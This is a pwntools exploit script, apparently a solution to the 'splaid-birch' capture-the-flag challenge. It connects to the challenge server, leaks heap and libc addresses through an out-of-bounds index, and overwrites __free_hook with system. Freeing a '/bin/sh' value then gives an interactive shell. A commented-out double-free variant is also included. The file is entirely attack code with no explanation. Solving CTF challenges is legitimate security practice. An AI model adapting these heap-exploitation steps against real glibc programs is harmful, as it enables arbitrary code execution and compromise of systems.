from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./splaid-birch", env = {"LD_PRELOAD":"./libsplaid.so.1"})
    libc = ELF("./libc.so.6")
    elf = ELF("./splaid-birch")
else:
    p = remote("splaid-birch.pwni.ng","17579")
    libc = ELF("./libc.so.6")
    elf = ELF("./splaid-birch")

def menu(choice):
    p.sendline(str(choice))

def free(value):
    menu(1)
    menu(value)

def show1(value):
    menu(2)
    menu(value)

def show2(index):
    menu(3)
    menu(index)

def show3(index):
    menu(4)
    menu(index)

def add(value,index):
    menu(5)
    menu(value)
    menu(index)

def isolate(p1,p2):
    menu(6)
    menu(p1)
    menu(p2)

def isolate2(p1,p2,p3):
    menu(7)
    menu(p1)
    menu(p2)
    menu(p3)

code_base = 0x555555554000
code_base2 = 0x7ffff7bd2000
def debugf():
	#gdb.attach(p,"b *{b1}\nb sp_select\nb sp_isolate\nb sp_del".format(b1 = hex(code_base + 0x1074)))
	gdb.attach(p,"b *{b1}\nb sp_select\nb sp_isolate\nb sp_del\nb sp_add\nb *{b2}".format(b1 = hex(code_base + 0x1074),b2 = hex(code_base2 + 0xE03)))
	#gdb.attach(p,"b *{b1}\nb sp_select\nb sp_isolate\nb sp_del\nb *{b2}".format(b1 = hex(code_base + 0x1074),b2 = hex(code_base + 0xD4E)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
"""
for i in range(0xa01):
    add(i,1)"""
add(1,1)
add(2,2)
add(3,3)
show3(541)
info = int(p.recvuntil("\n",drop = True))
heap_base = info - 0x1348
log.success("heap_base:" + hex(heap_base))
show3(1)
free(1)
free(2)
free(3)
for i in range(0xa0 - 4 - 2):
    add(1,1)
    free(1)
add(1,1)
add(2,2)
add(3,3)
add(4,4)
target = heap_base + 0x13c0
log.success("libc_leak_target:" + hex(target))
#debugf()
free(1)
free(2)
free(3)
free(4)
add(target - 8,9)
show3(-10)
#debugf()
p.recvline()
info = int(p.recvuntil("\n",drop = True))
libc.address = info - 96 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
#debugf()
show3(0xa1)
free(target - 8)
#debugf()
target_value = u64("/bin/sh\x00")
add(target_value,libc.symbols["__free_hook"] - 0x10)
show3(-9)
isolate2(libc.symbols["system"],0,0)
show3(0xa2)
free(target_value)
"""
target = heap_base + 0x18d0
log.success("double_free_target:" + hex(target))
add(target - 8,target - 8)
free(target - 8)
show3(-10)
free(0)
index_target = heap_base + 0x1320
free(index_target)
index_target = heap_base + 0x12d0
free(index_target)
debugf()
attack_target = libc.symbols["__free_hook"] - 8
attack_value = libc.symbols["system"]
attack_value2 = u64("/bin/sh\x00")
add(attack_target,0)
add(100,100)
add(101,101)
add(attack_value2 - 1,attack_value)
add(attack_value2 ,attack_value)
add(attack_value2 + 1,attack_value)
add(attack_value2 + 2,attack_value)
free(attack_value2)
"""
p.interactive()
